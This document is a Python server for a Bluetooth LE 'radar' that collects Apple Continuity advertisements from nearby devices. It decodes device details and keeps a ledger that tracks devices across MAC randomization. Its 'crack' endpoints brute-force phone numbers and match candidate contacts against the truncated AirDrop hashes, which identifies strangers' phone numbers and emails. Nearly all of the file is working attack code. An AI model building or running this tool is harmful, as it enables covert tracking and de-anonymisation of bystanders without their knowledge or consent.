#!/usr/bin/env python3
"""Live radar server — serves the radar page and aggregated BLE state.

Endpoints:
  GET  /            radar page
  GET  /api/state   aggregated device tracks from radar_live.jsonl
  POST /api/crack   {"candidates": [...]} -> AirDrop identity matches
"""
import hashlib
import json
import os
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

HERE = os.path.dirname(os.path.abspath(__file__))
JSONL = os.path.join(HERE, "radar_live.jsonl")
PAGE = os.path.join(HERE, "radar.html")


LEDGER = os.path.join(HERE, "ledger.jsonl")


def identity_key(t):
    """Stable identity from Continuity payload prefixes (survives MAC randomization)."""
    keys = set()
    for hexpl in t.get("airdrop", []):
        try:
            mfg = bytes.fromhex(hexpl)
        except ValueError:
            continue
        i = 2
        while i + 1 < len(mfg):
            typ, ln = mfg[i], mfg[i + 1]
            payload = mfg[i + 2:i + 2 + ln]
            if len(payload) < ln:
                break
            if payload.count(0) < len(payload) - 1 and len(payload) >= 4:
                keys.add(f"t{typ:02x}:{payload[:6].hex()}")
            i += 2 + ln
    return tuple(sorted(keys))


def ledger_load():
    past = {}
    if os.path.exists(LEDGER):
        with open(LEDGER) as fh:
            for line in fh:
                try:
                    r = json.loads(line)
                except json.JSONDecodeError:
                    continue
                past.setdefault(r["key"], []).append(r)
    return past


def ledger_update(tracks):
    """Record first/last sightings per stable identity; annotate tracks."""
    past = ledger_load()
    with open(LEDGER, "a") as fh:
        for t in tracks:
            key = identity_key(t)
            if not key:
                continue
            k = key[0]
            history = past.get(k, [])
            t["returning"] = len(history) > 0
            t["prior_visits"] = len(history)
            if not history or history[-1]["last_session"] < t["first"]:
                fh.write(json.dumps({"key": k, "mac": t["mac"], "name": t["name"],
                                     "labels": t["labels"], "first_session": t["first"],
                                     "last_session": t["last"]}) + "\n")
                if history:
                    t["returning"] = True
    return past



def aggregate():
    tracks = {}
    if not os.path.exists(JSONL):
        return {"tracks": []}
    with open(JSONL, "rb") as fh:
        for line in fh:
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            mac = rec.get("mac", "?")
            t = tracks.setdefault(mac, {"mac": mac, "name": "", "labels": set(),
                                        "best": -200, "worst": 200, "hits": 0,
                                        "first": rec["ts"], "last": rec["ts"],
                                        "airdrop": []})
            t["hits"] += 1
            t["last"] = rec["ts"]
            t["labels"].update(rec.get("labels") or [])
            r = rec.get("rssi", -200)
            if r != 127:
                t["best"] = max(t["best"], r)
                t["worst"] = min(t["worst"], r)
            if rec.get("name"):
                t["name"] = rec["name"]
            labels = rec.get("labels") or []
            mfg = rec.get("mfg", "")
            if mfg:
                for det in decode_tlvs(mfg):
                    if det not in t.get("details", []):
                        t.setdefault("details", []).append(det)
            if ("AirDrop" in labels or "AirDrop?" in labels) and mfg:
                t["airdrop"].append(mfg)
    out = []
    for t in tracks.values():
        t["labels"] = sorted(t["labels"])
        t["airdrop"] = t["airdrop"][-3:]
        if t["best"] > -200:
            out.append(t)
    out.sort(key=lambda t: -t["best"])
    return {"tracks": out, "ts": os.path.getmtime(JSONL) if os.path.exists(JSONL) else 0,
            "self": self_candidates()}


def self_candidates():
    """Zero-input consent: this Mac's own logged-in Apple ID contact.

    The operator owns this machine; their own identity is the one candidate
    set we may auto-derive and auto-check without any input.
    """
    import subprocess
    out = []
    try:
        r = subprocess.run(["defaults", "read", "MobileMeAccounts", "Accounts"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "AccountID" in line and "@" in line:
                email = line.split('"')[1]
                if email not in out:
                    out.append(email)
    except Exception:
        pass
    return out


TLV_MODELS = {
    0x01: "AirPodsGen1", 0x02: "AirPodsGen2", 0x03: "AirPodsGen3", 0x04: "AirPodsPro",
    0x05: "AirPodsPro2", 0x06: "AirPodsMax", 0x07: "AirPodsGen1", 0x08: "AirPodsGen2",
    0x09: "AirPodsGen3", 0x0A: "AirPodsPro", 0x0B: "AirPodsPro2", 0x0C: "AirPodsMax",
    0x0D: "BeatsStudio", 0x0E: "BeatsSolo3", 0x0F: "BeatsStudioPro", 0x10: "BeatsSoloPro",
    0x11: "BeatsSolo4", 0x12: "Powerbeats3", 0x13: "PowerbeatsPro", 0x14: "PowerbeatsPro2",
    0x15: "BeatsX", 0x16: "BeatsFlex", 0x17: "BeatsStudioBuds", 0x18: "BeatsStudioBudsPlus",
    0x19: "BeatsFitPro", 0x1A: "BeatsDuo", 0x1B: "BeatsFlex", 0x20: "UnknownAccessory",
    0x22: "AirTag", 0x23: "FindMyTag3rd",
}


def decode_tlvs(mfg_hex):
    """Decode Continuity TLV fields into human detail from a single mfg blob."""
    try:
        mfg = bytes.fromhex(mfg_hex)
    except (ValueError, TypeError):
        return []
    details = []
    i = 2
    while i + 1 < len(mfg):
        t, ln = mfg[i], mfg[i + 1]
        pl = mfg[i + 2:i + 2 + ln]
        if len(pl) < ln:
            break
        if t == 0x07 and ln >= 6 and pl[0] in TLV_MODELS:
            model = TLV_MODELS[pl[0]]
            battery = pl[5] if ln > 5 else None
            bstr = ""
            if battery is not None:
                if battery & 0x40: bstr = "charging"
                elif battery & 0x20: bstr = "battery:med"
                elif battery & 0x10: bstr = "battery:low"
                else: bstr = "battery:full"
            details.append(f"{model}{(' ' + bstr) if bstr else ''}")
        elif t == 0x0F:
            details.append("hotspot-source")
        elif t == 0x0E:
            details.append("hotspot-target")
        elif t == 0x10 and ln >= 1:
            flags = pl[0]
            bits = []
            if flags & 0x40: bits.append("wifi-on")
            if flags & 0x20: bits.append("icloud-acct")
            if flags & 0x10: bits.append("airdrop-recv")
            details.append("nearby:" + ("|".join(bits) or hex(flags)))
        elif t == 0x12 and ln >= 1:
            s = pl[0]
            details.append("FindMy:" + ("paired" if s == 0x00 else ("unpaired-adjacent" if s == 0x03 else hex(s))))
        elif t == 0x16:
            details.append("nearby-action")
        i += 2 + ln
    return details
def extract_tlv05(mfg_hex: str):
    try:
        mfg = bytes.fromhex(mfg_hex)
    except ValueError:
        return []
    out, i = [], 2
    while i + 1 < len(mfg):
        t, ln = mfg[i], mfg[i + 1]
        payload = mfg[i + 2:i + 2 + ln]
        if len(payload) < ln:
            break
        if t in (0x05, 0x09):
            out.append(payload)
        i += 2 + ln
    return out


def crack(candidates):
    state = aggregate()
    matches = []
    for t in state["tracks"]:
        windows = set()
        for hexpl in t["airdrop"]:
            for pl in extract_tlv05(hexpl):
                windows.update(pl[o:o + 2] for o in range(max(1, len(pl) - 1)))
        if not windows:
            continue
        for cand in candidates:
            cand = cand.strip()
            if not cand:
                continue
            variants = {cand}
            if any(c.isdigit() for c in cand):
                digits = "".join(c for c in cand if c.isdigit())
                variants = {cand, digits}
                if cand.startswith("+"):
                    variants.add(digits)
                else:
                    variants |= {cc + digits for cc in ("+41", "+49", "+1", "+44", "+33")}
            for v in variants:
                d = hashlib.sha256(v.encode()).digest()
                if (d[:2] in windows) or (d[1:3] in windows):
                    matches.append({"mac": t["mac"], "candidate": cand, "variant": v})
                    break
    return {"matches": matches, "scanned": len(state["tracks"])}


def crack_range(prefix, width, per_window_cap=25):
    """Range brute-force over observed AirDrop windows via airdrop_brute.

    Honest semantics: a 2-byte window over N candidates admits ~N/65536
    false positives — results are CANDIDATE SETS, not identities.
    """
    import subprocess
    state = aggregate()
    windows = set()
    per_dev = {}
    for t in state["tracks"]:
        tw = set()
        for hexpl in t["airdrop"]:
            for pl in extract_tlv05(hexpl):
                tw.update(pl[o:o + 2].hex() for o in range(max(1, len(pl) - 1)))
        if tw:
            per_dev[t["mac"]] = sorted(tw)
            windows.update(tw)
    if not windows:
        return {"mode": "range", "windows": {}, "devices": 0}
    winfile = "/tmp/radar_windows.txt"
    with open(winfile, "w") as fh:
        fh.write("\n".join(sorted(windows)) + "\n")
    proc = subprocess.run(
        [os.path.join(HERE, "airdrop_brute"), winfile, prefix, str(width), "10"],
        capture_output=True, text=True, timeout=600)
    by_win = {}
    for line in proc.stdout.splitlines():
        if line.startswith("HIT "):
            _, w, cand = line.split(maxsplit=2)
            by_win.setdefault(w, []).append(cand)
    return {
        "mode": "range", "prefix": prefix, "width": width,
        "devices": len(per_dev),
        "windows": {w: {"candidates": c[:per_window_cap], "total": len(c)}
                    for w, c in sorted(by_win.items())},
    }


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urlsplit(self.path).path
        if path == "/api/state":
            body = json.dumps(aggregate()).encode()
            self._send(200, body, "application/json")
        elif path == "/":
            with open(PAGE, "rb") as fh:
                self._send(200, fh.read(), "text/html; charset=utf-8")
        else:
            self._send(404, b"not found", "text/plain")

    def do_POST(self):
        p = urlsplit(self.path).path
        if p not in ("/api/crack", "/api/crack_range"):
            self._send(404, b"not found", "text/plain")
            return
        n = int(self.headers.get("Content-Length", 0))
        try:
            req = json.loads(self.rfile.read(n) or b"{}")
            if p == "/api/crack":
                body = json.dumps(crack(req.get("candidates", []))).encode()
            else:
                body = json.dumps(crack_range(str(req.get("prefix", "+4179")),
                                              int(req.get("width", 7)))).encode()
            self._send(200, body, "application/json")
        except Exception as e:
            self._send(400, json.dumps({"error": str(e)}).encode(), "application/json")

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8787
    print(f"radar on http://127.0.0.1:{port}", flush=True)
    ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
